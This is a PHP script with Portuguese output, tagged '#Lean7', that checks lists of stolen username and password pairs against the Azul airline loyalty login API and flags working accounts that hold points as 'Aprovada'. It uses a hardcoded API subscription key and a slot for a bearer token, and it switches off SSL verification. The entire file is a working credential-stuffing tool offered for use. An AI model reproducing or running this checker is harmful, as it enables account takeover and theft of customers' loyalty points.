<?php
error_reporting(0);
function multiexplode($delimiters, $string)
{
    $delim = implode('|', array_map('preg_quote', $delimiters));
    return preg_split("/($delim)/", $string);
}

function puxar($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

extract($_GET);
$del = array("|", ":");
$lista = $_GET['lista'];
$login = multiexplode($del, $lista)[0];
$senha = multiexplode($del, $lista)[1];
function getStr($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

function getstr2($string, $start, $end, $i)
{
    $str = explode($start, $string);
    $str = explode($end, $str[$i]);
    return $str[0];
}

if (file_exists('lean7.txt')) {
    unlink('lean7.txt');
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.4devs.com.br/ferramentas_online.php");
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . "/cookies.txt");
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . "/cookies.txt");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Host: www.4devs.com.br',
    'Accept: */*',
    'Sec-Fetch-Dest: empty',
    'Content-Type: application/x-www-form-urlencoded',
    'origin: https://www.4devs.com.br',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-Mode: cors',
    'referer: https://www.4devs.com.br/gerador_de_pessoas'
));
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'acao=gerar_pessoa&sexo=I&pontuacao=S&idade=0&cep_estado=&txt_qtde=1&cep_cidade=');
$end = curl_exec($ch);
$cpf = getStr($end, '"cpf":"', '"');
$cpf = str_replace('.', '', $cpf);
$cpf = str_replace('-', '', $cpf);
$cpf1 = substr($cpf, 0, 6);
$cpf2 = substr($cpf, -5);
$cpfcompleto = "$cpf1.$cpf2";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://b2c-api.voeazul.com.br/sales/b2c/customer/api/v1/customers/login');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/sendy.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/sendy.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: application/json, text/plain, */*',
'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
'authorization: EX3MPL0', /* Troque o Bearer aqui */
'content-type: application/json',
'ocp-apim-subscription-key: 0fc6ff296ef2431bb106504c92dd227c',
'referer: https://www.voeazul.com.br/',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36'));
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"userName":"' . $login . '","password":"' . $senha . '"}');
$voeazul = curl_exec($ch);

if (strpos($voeazul, 'data')) {
    $pontos = getStr($voeazul, '"points":', '},');
    if ($pontos > 0) {
        echo '<span class="badge badge-success">✅ #Aprovada </span> » [' . $login . '|' . $senha . '] » [' . $pontos . ' pnts] <span class="badge badge-success">[Conta encontrada!] #Lean7</span><br>';
    }else{
        exit;
    }
} elseif (strpos($voeazul, 'LoyaltyInvalidCredential')) {
    echo '<span class="badge badge-danger">🧨 #Reprovada </span> » [' . $login . '|' . $senha . '] » <span class="badge badge-danger">[Credenciais invalidas.] #Lean7</span><br>';
} else {
    echo '<span class="badge badge-danger">🧨 #Reprovada </span> » [' . $login . '|' . $senha . '] » <span class="badge badge-danger">[Erro! Bearer ou Email] #Lean7</span><br>';

}